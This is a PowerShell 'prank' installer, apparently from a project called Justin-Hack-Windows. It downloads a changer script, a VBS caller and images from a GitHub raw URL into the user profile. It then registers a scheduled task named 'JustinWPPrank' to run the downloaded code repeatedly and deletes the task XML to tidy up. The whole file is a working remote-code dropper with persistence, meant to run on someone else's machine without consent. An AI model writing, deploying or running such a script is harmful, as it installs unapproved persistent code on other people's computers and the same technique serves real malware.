# Images avaibles
$imagesName = @("justin", "selena", "justin_jesus", "justin_christmas", "justin_birthday")

# Get current dir
$imgExtension = ".bmp"
$jhPath = "$env:userprofile\jh"
$githubUrl = "https://raw.githubusercontent.com/mxcezl/Justin-Hack-Windows/master/"
$imagesUrl = "$githubUrl/images/"
$changerName = "changer.ps1"
$changerLocalPath = "$jhPath\$changerName"
$changerCallerName = "jhcaller.vbs"
$changerCallerLocalPath = "$jhPath\$changerCallerName"
$taskTemplateName = "taskTemplate.xml"
$taskTemplateNamePath = "$jhPath\$taskTemplateName"

# Create dir if not exists and hide output
if(!(Test-Path "$jhPath\imgs")){
    New-Item -ItemType Directory -Path "$jhPath\imgs" | Out-Null
}

# Download runner & changer files
$client = new-object System.Net.WebClient
$client.DownloadFile("$githubUrl/changer/$changerName", $changerLocalPath)
$client.DownloadFile("$githubUrl/changer/$changerCallerName", $changerCallerLocalPath)
$client.DownloadFile("$githubUrl/changer/$taskTemplateName", $taskTemplateNamePath)

# Download images from GitHub
$imagesDir = "$env:userprofile\jh\imgs"
$client = new-object System.Net.WebClient
foreach($imageName in $imagesName){
    $client.DownloadFile("$imagesUrl/$imageName$imgExtension", "$imagesDir\$imageName$imgExtension")
}

# Create XML task file
$content = Get-Content -Path "$jhPath\$taskTemplateName"

# Get current date and time in ISO 8601 format
$now = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"

# Replace Start Boundary & Command
$content = $content.replace('$StartBoundary$', $now)
$content = $content.replace('$Command$', $changerCallerLocalPath)

# Save as XML file
$content | Out-File -FilePath "$jhPath\task.xml" -Encoding ASCII

# Use task manager to create a task from xml file
schtasks /create /xml "$jhPath\task.xml" /tn "JustinWPPrank" /f

# Delete XML files
Remove-Item -Path "$jhPath\task.xml"
Remove-Item -Path $taskTemplateNamePath